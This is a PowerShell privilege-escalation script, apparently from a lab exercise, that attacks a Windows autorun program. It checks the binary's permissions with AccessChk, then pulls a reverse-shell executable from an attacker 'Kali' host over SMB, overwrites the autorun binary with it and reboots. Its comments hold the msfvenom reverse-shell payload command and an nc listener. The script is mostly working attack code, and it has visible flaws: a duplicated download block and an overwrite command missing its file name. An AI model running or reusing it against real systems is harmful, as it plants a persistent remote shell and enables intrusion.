$kali_ip = x.x.x.x

# Download and unzipm AccessChk.exe to enumerate a specific directory for loose permissions
certutil  -urlcache -f https://download.sysinternals.com/files/AccessChk.zip C:\Users\Public\AccessChk.zip
Expand-Archive -Force C:\Users\Public\AccessChk.zip c:\Users\Public\
$kali_ip = 192.168.1.186

Write-Output ("{0} - {1}" -f (Get-Date),  "***********") >> C:\Users\Public\Exploit_autorun.log
Write-Output ("{0} - {1}" -f (Get-Date),  "Starting autorun privesc exploit") >> C:\Users\Public\Exploit_autorun.log
Write-Output ("{0} - {1}" -f (Get-Date),  "Download and unzip accesschk anumeration tool") >> C:\Users\Public\Exploit_autorun.log
# Download and unzipm AccessChk.exe to enumerate a specific directory for loose permissions
certutil  -urlcache -f https://download.sysinternals.com/files/AccessChk.zip C:\Users\Public\AccessChk.zip
Expand-Archive -Force C:\Users\Public\AccessChk.zip c:\Users\Public\

Write-Output ("{0} - {1}" -f (Get-Date),  "Enumerating targetted directory for excessive privileges") >> C:\Users\Public\Exploit_autorun.log
# Check for permissions (which should have been configured as weak)
C:\Users\Public\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

Write-Output ("{0} - {1}" -f (Get-Date),  "Enumerating user privileges for ability to reboot computer") >> C:\Users\Public\Exploit_autorun.log
# Check uswer permissions for shutdown capability (SeShutdownPrivilege)
whoami /priv

# backup autorun exe, grab reverse shell exe from kali box, overwrite autorun exe
# REMEMBER to start samba share on Kali first:
# 
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=888 -f exe -o /tmp/reverse.exe
# sudo python /usr/local/bin/smbserver.py tmp /tmp/
# once copied open a reverse shell listener: nc -nvlp 888
Write-Output ("{0} - {1}" -f (Get-Date),  "Backing up weak permissions autorun exe") >> C:\Users\Public\Exploit_autorun.log
copy "C:\Program Files\Autorun Program\program.exe" c:\Temp\program.backup.exe

Write-Output ("{0} - {1}" -f (Get-Date),  "Grab reverse shell binary from kali box via smb") >> C:\Users\Public\Exploit_autorun.log
copy \\$kali_ip\tmp\reverse.exe c:\Users\Public\reverse.exe

Write-Output ("{0} - {1}" -f (Get-Date),  "Overwrite weak permissins binary with reverse shell") >> C:\Users\Public\Exploit_autorun.log
copy c:\Users\Public\ "C:\Program Files\Autorun Program\program.exe"

Write-Output ("{0} - {1}" -f (Get-Date),  "Reboot computer for reverse shell to auto start after reboot") >> C:\Users\Public\Exploit_autorun.log
Write-Output ("{0} - {1}" -f (Get-Date),  "***********") >> C:\Users\Public\Exploit_autorun.log
# Get an admin to log in, then restart computer
Restart-Computer
